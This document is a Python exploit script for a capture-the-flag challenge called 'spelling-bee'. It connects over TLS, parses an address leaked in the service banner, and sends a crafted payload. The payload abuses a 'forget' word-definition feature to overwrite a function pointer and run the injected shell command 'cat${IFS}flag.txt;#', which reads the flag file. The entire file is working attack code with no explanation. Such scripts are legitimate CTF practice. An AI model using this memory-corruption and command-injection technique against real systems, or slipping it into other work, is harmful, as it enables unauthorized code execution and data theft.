#!/usr/bin/env python3
import socket
import ssl
import struct
import sys


HOST = "spelling-bee.opus4-7.b01le.rs"
PORT = 8443

ctx = ssl.create_default_context()
with socket.create_connection((HOST, PORT)) as raw:
    with ctx.wrap_socket(raw, server_hostname=HOST) as sock:
        sock.settimeout(5.0)

        data = b""
        lines = []
        while len(lines) < 3:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
            while b"\n" in data and len(lines) < 3:
                line, data = data.split(b"\n", 1)
                lines.append(line + b"\n")

        if len(lines) < 3:
            raise RuntimeError("failed to read leak banner")

        banner = b"".join(lines)
        sys.stdout.buffer.write(banner)
        sys.stdout.buffer.flush()

        dosys = int(lines[2].strip(), 16)
        name_a = b"A" * 39
        cmd_prefix = b"cat${IFS}flag.txt;#"
        cmd = cmd_prefix + b"Q" * (127 - len(cmd_prefix))
        fake = b"R" * 24 + struct.pack("<Q", dosys)[:6]
        payload = b" ".join([
            b":",
            name_a,
            b"0",
            b";",
            b":",
            b"b",
            name_a,
            b";",
            b"forget",
            name_a,
            b":",
            cmd,
            b";",
            b":",
            fake,
            b";",
            b"b",
        ]) + b" "
        sock.sendall(payload)

        if data:
            sys.stdout.buffer.write(data)
            sys.stdout.buffer.flush()

        while True:
            try:
                chunk = sock.recv(4096)
            except TimeoutError:
                break
            if not chunk:
                break
            sys.stdout.buffer.write(chunk)
            sys.stdout.buffer.flush()
